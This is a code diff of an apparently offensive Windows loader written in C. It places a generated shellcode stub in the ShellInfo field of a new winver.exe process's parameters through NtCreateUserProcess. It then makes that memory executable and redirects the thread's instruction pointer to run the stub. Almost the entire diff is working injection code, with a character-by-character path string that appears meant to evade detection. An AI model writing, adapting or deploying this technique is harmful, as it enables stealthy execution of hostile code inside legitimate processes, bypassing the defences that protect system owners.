@@ -1,8 +1,9 @@
 #include <windows.h>
 #include <stdint.h>
 
+#include "native.h"
+
 #include "tcg.h"
-#include "win.h"
 #include "dfr.h"
 #include "utils.h"
 #include "shellwriter.h"
@@ -41,92 +42,150 @@ void go() {
     dprintf("[+] ShellWriter stub: %d bytes, nulls: %s\n",
         w.len, scw_check_nulls(&w) == -1 ? "none" : "BUG");
 
-    // wchar_t unicode_payload[masked_sc->length / 2]; 
-    // memset(unicode_payload, 0, sizeof(unicode_payload));
-    // bytes_to_wchar((const uint8_t*)unmasked_sc, sizeof(unmasked_sc), unicode_payload);
 
-    STARTUPINFOW si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-    si.cb = sizeof(si);
-
-    PROCESS_BASIC_INFORMATION pbi;
-    DWORD retLen;
-    
-    PEB pebLocal;
-    SIZE_T sizeToRead = sizeof(pebLocal);
-    SIZE_T bytesRead = 0;
-
-    RTL_USER_PROCESS_PARAMETERS parameters;
-
-    const wchar_t lpApplicationWide[] = {
-        L'C', L':', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\',
-        L'S', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\',
-        L'w', L'i', L'n', L'v', L'e', L'r', L'.', L'e', L'x', L'e', // winver.exe
+    wchar_t ntPath[] = {
+        L'\\',L'?',L'?',L'\\',
+        L'C',L':',L'\\',
+        L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',
+        L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',
+        L'w',L'i',L'n',L'v',L'e',L'r',L'.',L'e',L'x',L'e',
         L'\0'
     };
 
+    UNICODE_STRING imagePath;
+    imagePath.Buffer       = ntPath;
+    imagePath.Length       = (USHORT)(sizeof(ntPath) - sizeof(wchar_t));
+    imagePath.MaximumLength = sizeof(ntPath);
 
-    dprintf("[+] Calling CreateProcessW...\n");
-    si.lpReserved = (LPWSTR)stub;
-    KERNEL32$CreateProcessW(lpApplicationWide, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+    // ShellInfo as UNICODE_STRING with explicit Length
+    // Null bytes in stub are fine — no null-termination scan here
+    UNICODE_STRING shellInfoStr;
+    shellInfoStr.Buffer        = (PWSTR)stub;
+    shellInfoStr.Length        = (USHORT)w.len;
+    shellInfoStr.MaximumLength = (USHORT)sizeof(stub);
 
+    PRTL_USER_PROCESS_PARAMETERS procParams = NULL;
+    NTSTATUS status = 0;
 
-    dprintf("[+] Process created PID: %p\n", pi.dwProcessId);
+    status = NTDLL$RtlCreateProcessParametersEx(
+        &procParams,
+        &imagePath,   // ImagePathName
+        NULL,         // DllPath
+        NULL,         // CurrentDirectory
+        NULL,         // CommandLine
+        NULL,         // Environment
+        NULL,         // WindowTitle
+        NULL,         // DesktopInfo
+        &shellInfoStr,// ShellInfo ← stub goes here
+        NULL,         // RuntimeData
+        RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
 
-    KERNEL32$Sleep(200);
-
-    NTDLL$NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen);
-
-    NTSTATUS status;
-    status = NTDLL$NtReadVirtualMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeToRead, &bytesRead);
-    if(!NT_SUCCESS(status)){
-        dprintf("[-] Failed NtReadVirtualMemory (PEB)...\n");
-        return;
-    } 
-
-    status = NTDLL$NtReadVirtualMemory(pi.hProcess, pebLocal.ProcessParameters, &parameters, sizeof(RTL_USER_PROCESS_PARAMETERS), &bytesRead);
-    if(!NT_SUCCESS(status)){
-        dprintf("[-] Failed NtReadVirtualMemory (PROCPARAMS)...\n");
-        return;
-    }
-
-    ULONG_PTR remoteBuffer = (ULONG_PTR)parameters.ShellInfo.Buffer;
-    PVOID shellcode = (PVOID)remoteBuffer; 
-    
-    ULONG_PTR unalignedAddr = (ULONG_PTR)shellcode;
-    ULONG_PTR alignedAddr = unalignedAddr & ~(4096 - 1); 
-    PVOID base = (PVOID)alignedAddr;
-    ULONG oldp = 0;
-    
-    SIZE_T shellcodeSize = (SIZE_T)w.len + (unalignedAddr - alignedAddr);
-    
-    status = NTDLL$NtProtectVirtualMemory(pi.hProcess, &base, &shellcodeSize, PAGE_EXECUTE_READ, &oldp);
-
-    if(!NT_SUCCESS(status)){
-        dprintf("[-] Failed NtProtectVirtualMemory...\n");
-        return;
-    } 
-
-    CONTEXT ctx __attribute__((aligned(16)));
-    ZeroMemory(&ctx, sizeof(CONTEXT));
-    ctx.ContextFlags = CONTEXT_CONTROL; 
-
-    status = NTDLL$NtGetContextThread(pi.hThread, &ctx);
     if (!NT_SUCCESS(status)) {
-        dprintf("[-] NtGetContextThread failed...\n");
+        dprintf("[-] RtlCreateProcessParametersEx failed: 0x%X\n", status);
         return;
     }
 
-    // Hijack target thread RIP
+    PS_CREATE_INFO createInfo = {0};
+    createInfo.Size = sizeof(PS_CREATE_INFO);
+
+    PS_ATTRIBUTE_LIST attrList = {0};
+    attrList.TotalLength              = sizeof(PS_ATTRIBUTE_LIST);
+    attrList.Attributes[0].Attribute  = PS_ATTRIBUTE_IMAGE_NAME;
+    attrList.Attributes[0].Size       = imagePath.Length;
+    attrList.Attributes[0].ValuePtr   = imagePath.Buffer;
+    attrList.Attributes[0].ReturnLength = NULL;
+
+    HANDLE hProcess = NULL, hThread = NULL;
+
+    dprintf("[+] Calling NtCreateUserProcess...\n");
+    status = NTDLL$NtCreateUserProcess(
+        &hProcess,
+        &hThread,
+        PROCESS_ALL_ACCESS,
+        THREAD_ALL_ACCESS,
+        NULL, NULL,
+        0,                                   // ProcessFlags
+        0, 
+        procParams,
+        &createInfo,
+        &attrList);
+
+
+    LARGE_INTEGER delay;
+    delay.QuadPart = -2000000LL;  // 200ms
+    NTDLL$NtDelayExecution(FALSE, &delay);
+
+
+    NTDLL$RtlDestroyProcessParameters(procParams);
+
+    if (!NT_SUCCESS(status)) {
+        dprintf("[-] NtCreateUserProcess failed: 0x%X\n", status);
+        return;
+    }
+
+    PROCESS_BASIC_INFORMATION pbi = {0};
+    DWORD retLen    = 0;
+    SIZE_T bytesRead = 0;
+
+    NTDLL$NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &retLen);
+    dprintf("[+] Process created PID: %llu\n", pbi.UniqueProcessId);
+
+    PEB pebLocal = {0};
+    status = NTDLL$NtReadVirtualMemory(hProcess, pbi.PebBaseAddress,
+                                        &pebLocal, sizeof(pebLocal), &bytesRead);
+    if (!NT_SUCCESS(status)) {
+        dprintf("[-] NtReadVirtualMemory (PEB) failed\n");
+        return;
+    }
+
+    RTL_USER_PROCESS_PARAMETERS parameters = {0};
+    status = NTDLL$NtReadVirtualMemory(hProcess, pebLocal.ProcessParameters,
+                                        &parameters, sizeof(parameters), &bytesRead);
+    if (!NT_SUCCESS(status)) {
+        dprintf("[-] NtReadVirtualMemory (PROCPARAMS) failed\n");
+        return;
+    }
+
+    PVOID     shellcode     = (PVOID)parameters.ShellInfo.Buffer;
+    ULONG_PTR unaligned     = (ULONG_PTR)shellcode;
+    ULONG_PTR aligned       = unaligned & ~(4096 - 1);
+    PVOID     base          = (PVOID)aligned;
+    SIZE_T    shellcodeSize = (SIZE_T)w.len + (unaligned - aligned);
+    ULONG     oldp          = 0;
+
+    status = NTDLL$NtProtectVirtualMemory(hProcess, &base,
+                                           &shellcodeSize, PAGE_EXECUTE_READ, &oldp);
+    if (!NT_SUCCESS(status)) {
+        dprintf("[-] NtProtectVirtualMemory failed\n");
+        return;
+    }
+
+    CONTEXT ctx __attribute__((aligned(16))) = {0};
+    ctx.ContextFlags = CONTEXT_CONTROL;
+
+    status = NTDLL$NtGetContextThread(hThread, &ctx);
+    if (!NT_SUCCESS(status)) {
+        dprintf("[-] NtGetContextThread failed\n");
+        return;
+    }
+
     ctx.Rip = (DWORD64)shellcode;
-    
-    status = NTDLL$NtSetContextThread(pi.hThread, &ctx);
+
+    status = NTDLL$NtSetContextThread(hThread, &ctx);
     if (!NT_SUCCESS(status)) {
-        dprintf("[-] NtSetContextThread failed...\n");
+        dprintf("[-] NtSetContextThread failed\n");
         return;
-    } else {
-        dprintf("[+] Success hijacking thread RIP to shellcode!\n");
     }
+
+    dprintf("[+] RIP hijacked, resuming thread...\n");
+
+
+    LARGE_INTEGER wait_timeout;
+    wait_timeout.QuadPart = -10000000LL;  // 1 second
+    NTDLL$NtWaitForSingleObject(hThread, FALSE, &wait_timeout);
+
+    NTDLL$NtClose(hThread);
+    NTDLL$NtClose(hProcess);
 
     dprintf("[+] === EXIT LOADER ===\n");
    
